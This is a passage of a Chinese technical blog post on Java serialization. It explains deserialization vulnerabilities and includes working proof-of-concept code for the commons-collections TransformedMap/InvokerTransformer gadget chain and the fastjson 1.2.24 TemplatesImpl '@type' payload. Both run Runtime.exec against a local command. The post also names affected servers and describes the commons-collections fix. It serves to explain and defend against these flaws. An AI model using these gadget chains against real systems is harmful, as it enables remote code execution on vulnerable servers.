birthday = 4;</span><br><span class=\"line\">    int32 gender = 5;</span><br><span class=\"line\">    string addr = 6;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用的对象比较简单，暂时未测试复杂对象的序列化。对比图如下：<br><img src=\"/images/old/20180325%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72018-03-25%E4%B8%8B%E5%8D%885.09.54.png\"><br><img src=\"/images/old/20180325%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72018-03-25%E4%B8%8B%E5%8D%885.09.37.png\"></p>\n<p>Thrift未加入进行比较，和protobuf同样是先定义好文件，所以速度应该也会很快。</p>\n<h3 id=\"序列化安全\"><a href=\"#序列化安全\" class=\"headerlink\" title=\"序列化安全\"></a>序列化安全</h3><p>在对对象进行反序列化的时候，用户自定义了readObject，那么就会执行readObject中的方法进行调用，反序列化对象。存在恶意代码，如通过Runtime.getRuntime().exec执行危险命令，那么程序就会变得非常危险。</p>\n<p>正常情况下，开发人员不会直接在readObject中执行相关命令，但是如果引用第三方包，第三方包可能存在反序列化漏洞。</p>\n<h4 id=\"commons-collections漏洞（低于3-2-1）\"><a href=\"#commons-collections漏洞（低于3-2-1）\" class=\"headerlink\" title=\"commons-collections漏洞（低于3.2.1）\"></a>commons-collections漏洞（低于3.2.1）</h4><p>在commons-collections中有个类<code>TransformedMap</code>是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素加入集合时，自动对该类进行特定的修饰转换。<br>添加maven依赖</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>commons-collections<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>commons-collections<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>3.2.1<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>TransformedMap使用如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Map</span> <span class=\"variable\">decorate</span> <span class=\"operator\">=</span> TransformedMap.decorate(<span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;String, String&gt;(), <span class=\"literal\">null</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>() &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Object <span class=\"title function_\">transform</span><span class=\"params\">(Object input)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ((String) input) + <span class=\"string\">&quot;~~~&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">decorate.put(<span class=\"string\">&quot;test&quot;</span>, <span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\">System.out.println(decorate);<span class=\"comment\">//&#123;test=test~~~&#125;</span></span><br></pre></td></tr></table></figure>\n<p>对传入的值进行处理。<br>TransformedMap传入的是Transformer，该接口有很多实现类，其中<code>InvokerTransformer</code>是里面的一个关键实现类。通过<code>ChainedTransformer</code>构造多个<code>InvokerTransformer</code>。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"title function_\">ChainedTransformer</span><span class=\"params\">(Transformer[] transformers)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">super</span>();</span><br><span class=\"line\">    iTransformers = transformers;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> Object <span class=\"title function_\">transform</span><span class=\"params\">(Object object)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class=\"line\">        object = iTransformers[i].transform(object);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> object;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ChainedTransformer关键方法如上，通过构造函数构造多个Transformer传入，transform实现为依次调用传入的<code>transformers</code>，同时把返回值传入下一个<br><code>Transformer.transform</code>。这样就可以形成方法调用链。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"title function_\">InvokerTransformer</span><span class=\"params\">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">super</span>();</span><br><span class=\"line\">    iMethodName = methodName;</span><br><span class=\"line\">    iParamTypes = paramTypes;</span><br><span class=\"line\">    iArgs = args;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> Object <span class=\"title function_\">transform</span><span class=\"params\">(Object input)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (input == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">cls</span> <span class=\"operator\">=</span> input.getClass();</span><br><span class=\"line\">        <span class=\"type\">Method</span> <span class=\"variable\">method</span> <span class=\"operator\">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> method.invoke(input, iArgs);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FunctorException</span>(<span class=\"string\">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class=\"string\">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class=\"string\">&quot;&#x27; does not exist&quot;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (IllegalAccessException ex) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FunctorException</span>(<span class=\"string\">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class=\"string\">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class=\"string\">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (InvocationTargetException ex) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FunctorException</span>(<span class=\"string\">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class=\"string\">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class=\"string\">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>InvokerTransformer核心方法如上，通过构造传入的值，通过反射调用方法，返回反射调用的值。实例如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Transformer[] transformers = &#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantTransformer</span>(Runtime.class),</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;getMethod&quot;</span>,</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;</span><br><span class=\"line\">                        <span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"literal\">null</span></span><br><span class=\"line\">                &#125;),</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;invoke&quot;</span>,</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;</span><br><span class=\"line\">                        <span class=\"literal\">null</span>,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[<span class=\"number\">0</span>]</span><br><span class=\"line\">                &#125;),</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;</span><br><span class=\"line\">                        String.class&#125;,</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;atom&quot;</span>&#125;)</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"type\">Transformer</span> <span class=\"variable\">chainedTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\">Map&lt;String, String&gt; map = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\">map.put(<span class=\"string\">&quot;key&quot;</span>, <span class=\"string\">&quot;value&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Map</span> <span class=\"variable\">outMap</span> <span class=\"operator\">=</span> TransformedMap.decorate(map, <span class=\"literal\">null</span>, chainedTransformer);</span><br><span class=\"line\">outMap.put(<span class=\"string\">&quot;key&quot;</span>, <span class=\"string\">&quot;val&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>通过精心构造调用链，当TransformedMap传入值是，回调Transformer，最终调用的是<code>transformers</code>数组调用链。<br>最终执行类似于如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Class&lt;Runtime&gt; runtimeClass = Runtime.class;</span><br><span class=\"line\"><span class=\"type\">Method</span> <span class=\"variable\">method</span> <span class=\"operator\">=</span> runtimeClass.getMethod(<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\"><span class=\"comment\">//static 方法</span></span><br><span class=\"line\"><span class=\"type\">Runtime</span> <span class=\"variable\">runtime</span> <span class=\"operator\">=</span> (Runtime)method.invoke(<span class=\"literal\">null</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[<span class=\"number\">0</span>]);</span><br><span class=\"line\">runtime.exec(<span class=\"string\">&quot;atom&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>如何利用该漏洞呢，需要找到一个可以利用该漏洞的类：<br>1、自定义了反序列化方法。<br>2、类存在属性Map<br>3、有对Map对象赋值操作。</p>\n<p>刚刚好<code>sun.reflect.annotation.AnnotationInvocationHandler</code>满足该类。该类有个Map属性，同时实现了反序列化方法，同时在反序列化的时候对Map进行了赋值。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        save(<span class=\"string\">&quot;obj.out&quot;</span>);</span><br><span class=\"line\">        load(<span class=\"string\">&quot;obj.out&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Map <span class=\"title function_\">save</span><span class=\"params\">(String filePath)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"comment\">//构造需要的Map</span></span><br><span class=\"line\">        Transformer[] transformers = &#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantTransformer</span>(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;getMethod&quot;</span>,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;</span><br><span class=\"line\">                                <span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"literal\">null</span></span><br><span class=\"line\">                        &#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;invoke&quot;</span>,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;</span><br><span class=\"line\">                                <span class=\"literal\">null</span>,</span><br><span class=\"line\">                                <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[<span class=\"number\">0</span>]</span><br><span class=\"line\">                        &#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;</span><br><span class=\"line\">                                String.class&#125;,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;atom&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"type\">Transformer</span> <span class=\"variable\">chainedTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\">        Map&lt;String, String&gt; map = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\">        <span class=\"comment\">//重点：key的值必须为value</span></span><br><span class=\"line\">        map.put(<span class=\"string\">&quot;value&quot;</span>, <span class=\"string\">&quot;value&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Map</span> <span class=\"variable\">outMap</span> <span class=\"operator\">=</span> TransformedMap.decorate(map, <span class=\"literal\">null</span>, chainedTransformer);</span><br><span class=\"line\">        <span class=\"comment\">//反射构造对象</span></span><br><span class=\"line\">        Class&lt;?&gt; clazz = Class.forName(<span class=\"string\">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class=\"line\">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class=\"line\">        constructor.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> constructor.newInstance(Target.class, outMap);</span><br><span class=\"line\">        <span class=\"comment\">//序列化对象</span></span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(filePath));</span><br><span class=\"line\">        outputStream.writeObject(obj);</span><br><span class=\"line\">        outputStream.close();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> outMap;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 反序列化</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> filePath</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@throws</span> Exception</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Object <span class=\"title function_\">load</span><span class=\"params\">(String filePath)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">inputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(filePath));</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> inputStream.readObject();</span><br><span class=\"line\">        inputStream.close();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>先构造需要的Map对象，之后通过反射构造AnnotationInvocationHandler对象，对该对象进行序列化。之后反序列化的时候，就会执行之前构造的命令。<br>很多服务之间数据传输就是使用的序列化对象，如果对传输的序列化对象进行拦截抓包，伪造自定义的序列化对象，接收端在反序列化的时候就会执行代码中构造的命令。<br>出现该漏洞的有：WebLogic、WebSphere、JBoss、Jenkins等。<br>反序列化漏洞利用工具参考 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Zyb2hvZmYveXNvc2VyaWFs\">https://github.com/frohoff/ysoserial<i class=\"fa fa-external-link-alt\"></i></span> 还有利用反序列化切入点。</p>\n<h5 id=\"commons-collections漏洞解决办法\"><a href=\"#commons-collections漏洞解决办法\" class=\"headerlink\" title=\"commons-collections漏洞解决办法\"></a>commons-collections漏洞解决办法</h5><p>更新版本超过3.2.1版本。<br>commons-collections新版本如何修复的呢，在<code>InvokerTransformer</code>的<code>writeObject、readObject</code>加入了检查不安全的序列化<code>FunctorUtils.checkUnsafeSerialization</code>，其实就是从System中读取<code>org.apache.commons.collections.enableUnsafeSerialization</code>判断是否为true，如果不是就报错，那么<code>InvokerTransformer</code>就无法进行序列化以及反序列化。</p>\n<h4 id=\"fastjson漏洞\"><a href=\"#fastjson漏洞\" class=\"headerlink\" title=\"fastjson漏洞\"></a>fastjson漏洞</h4><p>在对对象进行json序列化时，除了使用Gson还有fastjson，不过fastjson爆出过序列化漏洞<br>添加Maven依赖</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.alibaba<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>fastjson<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!--1.2.22-1.2.24--&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.2.24<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>先构造一个用于执行的类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ExecRun</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractTranslet</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">ExecRun</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        StackTraceElement[] stackTrace = Thread.currentThread().getStackTrace();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;调用栈~~~~~~&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (StackTraceElement stackTraceElement : stackTrace) &#123;</span><br><span class=\"line\">            System.out.println(stackTraceElement);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;调用栈~~~~~~&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            Runtime.getRuntime().exec(<span class=\"string\">&quot;atom&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">transform</span><span class=\"params\">(DOM document, SerializationHandler[] handlers)</span> <span class=\"keyword\">throws</span> TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">transform</span><span class=\"params\">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class=\"keyword\">throws</span> TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>编译该类得到class。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\">        <span class=\"comment\">//编译后文件路径</span></span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">execRunPath</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;./target/classes/com/whh/netty/ExecRun.class&quot;</span>;</span><br><span class=\"line\">        <span class=\"comment\">//读取文件字节码</span></span><br><span class=\"line\">        <span class=\"type\">FileInputStream</span> <span class=\"variable\">inputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(execRunPath);</span><br><span class=\"line\">        <span class=\"type\">ByteArrayOutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ByteArrayOutputStream</span>(<span class=\"number\">1024</span>);</span><br><span class=\"line\">        <span class=\"type\">byte</span>[]bytes = <span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[<span class=\"number\">1024</span>];</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">len</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> ((len = inputStream.read(bytes)) != -<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">            outputStream.write(bytes, <span class=\"number\">0</span>, len);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//编译字节码为base64</span></span><br><span class=\"line\">        <span class=\"type\">BASE64Encoder</span> <span class=\"variable\">encoder</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">BASE64Encoder</span>();</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">base64Str</span> <span class=\"operator\">=</span> encoder.encode(outputStream.toByteArray()).replace(<span class=\"string\">&quot;\\n&quot;</span>, <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//构造json</span></span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">templatesImpl</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">sb</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;&quot;</span> +</span><br><span class=\"line\">                templatesImpl +</span><br><span class=\"line\">                <span class=\"string\">&quot;\\&quot;,\\&quot;_bytecodes\\&quot;:[\\&quot;&quot;</span> +</span><br><span class=\"line\">                base64Str +</span><br><span class=\"line\">                <span class=\"string\">&quot;\\&quot;], \\&quot;_name\\&quot;:\\&quot;a.b\\&quot;, \\&quot;_tfactory\\&quot;:&#123;&#125;,\\&quot;_outputProperties\\&quot;:&#123; &#125;&#125;&quot;</span>;</span><br><span class=\"line\">        <span class=\"comment\">//序列化对象</span></span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">o</span> <span class=\"operator\">=</span> JSON.parseObject(sb, Object.class, Feature.SupportNonPublicField);</span><br><span class=\"line\">        System.out.println(o <span class=\"keyword\">instanceof</span> TemplatesImpl);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>执行该Main方法后就会执行ExecRun的构造函数。<br>可以通过上述构造的json提交远程服务器，如果服务器存在该反序列化漏洞，那么就会执行之前ExecRun中的方法。</p>\n<p>执行的调用栈：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">java.lang.Thread.getStackTrace(Thread.java:1552)</span><br><span class=\"line\">com.whh.netty.ExecRun.&lt;init&gt;(ExecRun.java:18)</span><br><span class=\"line\">sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)</span><br><span class=\"line\">sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)</span><br><span class=\"line\">sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)</span><br><span class=\"line\">java.lang.reflect.Constructor.newInstance(Constructor.java:422)</span><br><span class=\"line\">java.lang.Class.newInstance(Class.java:442)</span><br><span class=\"line\">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:408)</span><br><span class=\"line\">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:439)</span><br><span class=\"line\">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:460)</span><br><span class=\"line\">sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class=\"line\">sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class=\"line\">sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class=\"line\">java.lang.reflect.Method.invoke(Method.java:497)</span><br><span class=\"line\">com.alibaba.fastjson.parser.deserializer.FieldDeserializer.setValue(FieldDeserializer.java:85)</span><br><span class=\"line\">com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer.parseField(DefaultFieldDeserializer.java:83)</span><br><span class=\"line\">com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseField(JavaBeanDeserializer.java:773)</span><br><span class=\"line\">com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:600)</span><br><span class=\"line\">com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:188)</span><br><span class=\"line\">com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:184)</span><br><span class=\"line\">com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:368)</span><br><span class=\"line\">com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327)</span><br><span class=\"line\">com.alibaba.fastjson.parser.deserializer.JavaObjectDeserializer.deserialze(JavaObjectDeserializer.java:45)</span><br><span class=\"line\">com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:639)</span><br><span class=\"line\">com.alibaba.fastjson.JSON.parseObject(JSON.java:339)</span><br><span class=\"line\">com.alibaba.fastjson.JSON.parseObject(JSON.java:302)</span><br><span class=\"line\">com.whh.netty.Main.main(Main.java:39)</span><br></pre></td></tr></table></figure>\n<p>该漏洞原理是，在fastjson在反序列化时，可以通过<code>@type</code>指定解析类，fastjson会根据指定类去反序列化得到该类的实例，默认只会反序列化public的属性，所以通过<code>Feature.SupportNonPublicField</code>开启私有属性序列化，属性<code>_tfactory</code>无get、set方法，设置<code>_tfactory:&#123; 